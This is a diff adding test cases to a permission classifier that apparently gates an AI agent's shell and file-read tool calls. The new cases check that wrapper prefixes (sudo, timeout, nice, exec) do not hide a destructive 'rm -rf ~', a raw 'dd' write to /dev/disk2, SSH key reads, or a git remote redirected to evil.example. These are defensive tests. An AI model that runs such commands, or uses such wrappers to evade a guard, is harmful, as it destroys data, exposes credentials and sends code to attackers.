@@ -429,6 +429,11 @@ describe('PermissionClassifier', () => {
         { command: 'rm -rf usr' },
         { ...context, workingDirectory: '/' },
       );
+      const wrappedHome = await classifyPermission(
+        'Bash',
+        { command: 'sudo -u me rm -rf ~' },
+        context,
+      );
 
       expect(workspaceChild.decision).toBe('ask');
       expect(systemChild.decision).toBe('deny');
@@ -438,6 +443,7 @@ describe('PermissionClassifier', () => {
       expect(quotedRoot.decision).toBe('deny');
       expect(quotedHome.decision).toBe('deny');
       expect(relativeSystemFromRoot.decision).toBe('deny');
+      expect(wrappedHome.decision).toBe('deny');
     });
 
     it('only denies dd when its output targets /dev', async () => {
@@ -456,10 +462,22 @@ describe('PermissionClassifier', () => {
         { command: 'dd if=x of="/dev/disk2"' },
         context,
       );
+      const wrappedDeviceOutput = await classifyPermission(
+        'Bash',
+        { command: 'timeout 5 dd if=x of=/dev/disk2' },
+        context,
+      );
+      const workspaceCopy = await classifyPermission(
+        'Bash',
+        { command: 'dd if=README.md of=out.img' },
+        context,
+      );
 
       expect(fileOutput.decision).toBe('ask');
       expect(deviceOutput.decision).toBe('deny');
       expect(quotedDeviceOutput.decision).toBe('deny');
+      expect(wrappedDeviceOutput.decision).toBe('deny');
+      expect(workspaceCopy.decision).toBe('approve');
     });
 
     it('asks for credential reads through Bash and Read while keeping templates and normal files readable', async () => {
@@ -479,6 +497,7 @@ describe('PermissionClassifier', () => {
         'TOKEN=x cat ~/.ssh/id_rsa',
         'command cat ~/.ssh/id_rsa',
         'command -p cat ~/.ssh/id_rsa',
+        'ls -la ~/.ssh/',
       ];
       const bashSecrets = await Promise.all(credentialCommands.map((command) => (
         classifyPermission('Bash', { command }, context)
@@ -537,6 +556,7 @@ describe('PermissionClassifier', () => {
         'env git remote set-url origin https://evil.example/x.git',
         'command git remote set-url origin https://evil.example/x.git',
         'command -- git config credential.helper store',
+        'nice -n 5 git remote set-url origin https://evil.example/x.git',
       ];
       const writes = await Promise.all(protectedWrites.map((command) => (
         classifyPermission('Bash', { command }, context)
@@ -581,10 +601,19 @@ describe('PermissionClassifier', () => {
         { command: 'command git push origin feature-x' },
         context,
       );
+      const execWrappedPush = await classifyPermission(
+        'Bash',
+        { command: 'exec git push origin feature-x' },
+        context,
+      );
       const dryRun = await classifyPermission('Bash', { command: 'npm publish --dry-run' }, context);
 
       expect(push.decision).toBe('ask');
       expect(wrappedPush).toMatchObject({
+        decision: 'ask',
+        traceStep: { rule: 'B1: git_remote_or_credential_write' },
+      });
+      expect(execWrappedPush).toMatchObject({
         decision: 'ask',
         traceStep: { rule: 'B1: git_remote_or_credential_write' },
       });
